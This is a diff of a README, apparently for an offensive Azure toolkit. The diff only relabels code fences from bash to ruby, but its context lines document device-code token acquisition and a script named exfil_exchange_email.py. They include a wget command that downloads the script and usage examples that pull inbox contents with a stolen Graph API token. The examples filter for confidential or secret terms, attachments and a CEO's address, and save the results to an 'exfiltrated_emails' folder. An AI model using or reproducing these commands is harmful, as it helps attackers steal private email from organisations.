@@ -27,14 +27,14 @@ A PowerShell script that demonstrates automated token acquisition using the Azur
 
 ### Usage
 
-```bash
+```ruby
 pwsh
 .\query.ps1
 ```
 
 ## Authentication Flow
 1. When executed, the script will output something like:
-```bash
+```ruby
 Requesting device code...
 Authentication URL: https://microsoft.com/devicelogin
 User Code: ABCD-EFGH
@@ -98,7 +98,7 @@ A Python script that leverages Microsoft Graph API access tokens to retrieve and
   ```
 
 ### Installation
-```bash
+```ruby
 wget https://raw.githubusercontent.com/0xG00S3/Azure/refs/heads/main/exfil_exchange_email.py
 ```
 
@@ -106,14 +106,14 @@ wget https://raw.githubusercontent.com/0xG00S3/Azure/refs/heads/main/exfil_excha
 
 #### Basic Usage
 Pull all emails from inbox:
-```bash
+```ruby
 python3 exfil_exchange_email.py --token "your_graph_api_token"
 ```
 
 #### Advanced Filtering Examples
 
 1. Search for sensitive documents:
-```bash
+```ruby
 python3 exfil_exchange_email.py --token "your_token" \
 --query "confidential,secret,internal" \
 --has-attachments \
@@ -121,7 +121,7 @@ python3 exfil_exchange_email.py --token "your_token" \
 ```
 
 2. Target date ranges with specific attachment types:
-```bash
+```ruby
 python3 exfil_exchange_email.py --token "your_token" \
 --start-date "2024-01-01" \
 --end-date "2024-03-01" \
@@ -130,7 +130,7 @@ python3 exfil_exchange_email.py --token "your_token" \
 ```
 
 3. Filter by sender and exclude terms:
-```bash
+```ruby
 python3 exfil_exchange_email.py --token "your_token" \
 --from-address "ceo@company.com" \
 --exclude-terms "newsletter,automated" \
@@ -138,7 +138,7 @@ python3 exfil_exchange_email.py --token "your_token" \
 ```
 
 #### Available Arguments
-```bash
+```ruby
 --token Required. Microsoft Graph API token
 --output Output directory (default: exfiltrated_emails)
 --query Search terms (comma-separated)
@@ -157,7 +157,7 @@ python3 exfil_exchange_email.py --token "your_token" \
 ```
 
 #### Output Structure
-```bash
+```ruby
 exfiltrated_emails/
 ├── YYYYMMDD_HHMMSS_EmailSubject1/
 │ ├── body.html
